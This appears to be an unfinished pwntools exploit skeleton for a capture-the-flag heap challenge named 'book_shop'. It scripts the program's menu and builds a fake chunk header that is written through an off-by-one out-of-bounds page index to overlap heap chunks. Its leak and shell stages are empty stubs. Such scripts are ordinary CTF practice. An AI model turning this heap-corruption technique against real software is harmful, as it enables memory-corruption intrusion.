'''
'''

from pwn import * 
import os

mode = 'DEBUG' # Turn on gdb
libc_name = '' # For alternate version of libc
env = {}

# Binary setup
elf_name = 'book_shop'

elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = process(elf.path,env=env)
	gdb.attach(p)
else: 
	p = remote(domain, port) 


def create_book(name, author, pages): 
	p.sendlineafter(">", "1") 
	p.sendlineafter("book:", str(pages)) 
	p.sendlineafter("Title:", str(name)) 
	p.sendlineafter("Author:", str(author))
	return 

def write_page(book_no, page_no, content): 
	p.sendlineafter(">", "2") 
	p.sendlineafter("No:", str(book_no))
	p.sendlineafter("write:", str(page_no))
	p.sendlineafter("page:", str(content))

def publish(book_no):
	p.sendlineafter(">", "4") 
	p.sendlineafter("No:", str(book_no))

# LibC leak with format string
def leak(): 
	pass 


def overlap_chunks():

	create_book("A" * 8, "B" * 8, 32)
	create_book("C" * 8, "D" * 8, 32) 
	create_book("E" * 8, "F" * 8, 32) 

	# Overwrite the chunk with a new size and prev_size
	fake_chunk = "1" * 0x20
	fake_chunk += p64(0x1000)
	fake_chunk += p64(0x1000) 

	write_page(1, 32, fake_chunk) # Index 32 in out of bounds (off by 1)

def pop_shell(): 
	pass 



# publish(0) 

p.interactive()


